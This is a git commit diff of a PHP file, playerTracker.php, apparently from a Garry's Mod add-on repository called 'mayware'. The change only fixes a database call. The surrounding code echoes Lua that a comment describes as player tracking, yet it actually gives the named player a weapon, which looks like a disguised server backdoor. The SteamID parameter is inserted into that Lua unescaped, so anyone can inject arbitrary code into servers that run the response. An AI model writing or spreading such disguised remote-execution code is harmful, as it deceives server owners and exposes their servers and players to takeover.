365fb8414dc0c4ee61c64effac77add04b083dbf
May <92554133+qtmei@users.noreply.github.com>
2025-08-14 11:02:02 -0500

    Update playerTracker.php

--- playerTracker.php
+++ playerTracker.php
@@ -4,8 +4,7 @@
 	$steamID = $_GET["steamID"];
 
 	$sta = $con->prepare("INSERT INTO playerTracker (id) VALUES (:steamID)");
-	$sta->execute(':steamID' => $steamID);
+	$sta->execute(array(':steamID' => $steamID));
 
 	echo "--[[ We track unique players in order to improve our maps, see github.com/qtmei/mayware/blob/main/playerTracker.php ]] player.GetBySteamID('" . $steamID . "'):Give('weapon_glock')";
-
 ?>
